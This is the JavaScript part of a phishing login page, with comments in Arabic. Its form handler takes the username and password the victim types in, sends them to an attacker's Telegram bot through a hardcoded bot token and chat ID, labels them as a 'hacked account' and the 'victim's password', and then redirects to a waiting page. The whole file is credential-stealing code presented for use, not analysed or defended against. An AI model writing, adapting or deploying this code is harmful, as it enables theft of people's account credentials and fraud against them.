function validateForm() {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let errorMessage = document.getElementById("error-message");

    if (username === "" || password === "") {
        errorMessage.textContent = "يرجى ملء جميع الحقول!";
    } else {
        errorMessage.textContent = "";

        // إرسال البريد إلى البوت
        sendToBot(`📩 تم اختراق حساب جديد: ${username}`);

        // إرسال كلمة المرور إلى البوت
        sendToBot(`🔑 باسورد الضحيه: ${password}`);

        // **إضافة مهلة 2 ثانية ثم التوجيه إلى صفحة الانتظار**
        setTimeout(() => {
            window.location.href = "waiting.html";
        }, 1000); // مهلة 2 ثانية قبل التوجيه
    }
}

// دالة إرسال البيانات إلى بوت التليجرام
function sendToBot(message) {
    const botToken = "7681653454:AAEdoXFfTtBOxL8F3i06jWeBWQjeQjlP-RQ";
    const chatId = "{user_id}'; 5375214810";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Message sent successfully");
            } else {
                console.log("Failed to send message");
            }
        })
        .catch(error => console.error('Error sending message to bot:', error));
}
